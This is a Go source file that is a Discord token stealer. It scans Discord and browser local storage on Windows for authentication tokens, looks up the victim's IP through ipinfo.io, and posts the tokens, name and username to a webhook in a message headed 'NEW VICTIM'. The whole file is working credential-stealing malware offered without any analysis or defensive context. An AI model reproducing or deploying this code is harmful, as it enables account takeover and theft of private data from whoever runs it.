package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/user"
	"regexp"
	"strings"
)

func gn() string {
	user, err := user.Current()
	if err != nil {
		return "none"
	}
	return user.Name
}

func gp() string {
	user, err := user.Current()
	if err != nil {
		return "none"
	}
	return user.Username
}

func gi() string {
	resp, err := http.Get("https://ipinfo.io/?token=112b3614fc802c")
	if err != nil {
		return "err"
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "err"
	}

	i := string(body)

	return i
}

func sw(message string) {
	url := "%s"
	values := map[string]string{
		"content": message,
	}
	jsonData, err := json.Marshal(values)
	if err != nil {
		return
	}
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return
	}

	var res map[string]interface{}

	json.NewDecoder(resp.Body).Decode(&res)

}

func gt() string {
	ROAMING := os.Getenv("APPDATA")
	LOCAL := os.Getenv("LOCALAPPDATA")
	tokens := []string{}
	PATHS := map[string]string{
		"Discord":        ROAMING + "\\Discord",
		"Discord Canary": ROAMING + "\\discordcanary",
		"Discord PTB":    ROAMING + "\\discordptb",
		"Google Chrome":  LOCAL + "\\Google\\Chrome\\User Data\\Default",
		"Opera":          ROAMING + "\\Opera Software\\Opera Stable",
		"Brave":          LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
	}

	for _, path := range PATHS {
		if _, err := os.Stat(path); err == nil {
			path += "\\Local Storage\\leveldb\\"
			files, err := ioutil.ReadDir(path)
			if err != nil {
				continue
			}
			for _, file := range files {
				if strings.HasSuffix(file.Name(), ".ldb") || strings.HasSuffix(file.Name(), ".log") {
					data, err := ioutil.ReadFile(path + file.Name())
					if err != nil {
						fmt.Println(err)
						continue
					}
					reNotmfa, err := regexp.Compile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}`)
					if err == nil {
						if string(reNotmfa.Find(data)) != "" {
							tokens = append(tokens, string(reNotmfa.Find(data)))
						}
					}
					reMfa, err := regexp.Compile(`mfa\.[\w-]{84}`)
					if err == nil {
						if string(reMfa.Find(data)) != "" {
							tokens = append(tokens, string(reMfa.Find(data)))
						}
					}
				}
			}
		} else {
			continue
		}
	}
	return strings.Join(tokens, " ; ")
}

func main() {
	t := gt()
	i := gi()
	p := gp()
	n := gn()
	re := strings.NewReplacer(`%ttt%`, t, `%iii%`, i, `%ppp%`, p, `%nnn%`, n, "´", "`")
	mm := `
:clown: **NEW VICTIM** :clown:

´´´py
Name >> 

" %nnn% "

Username >> 

" %ppp% "

Tokens >> 

" %ttt% "

More info  >>

%iii%
´´´
_´´by kp with <3´´_

`
	ct := re.Replace(mm)
	sw(ct)
}
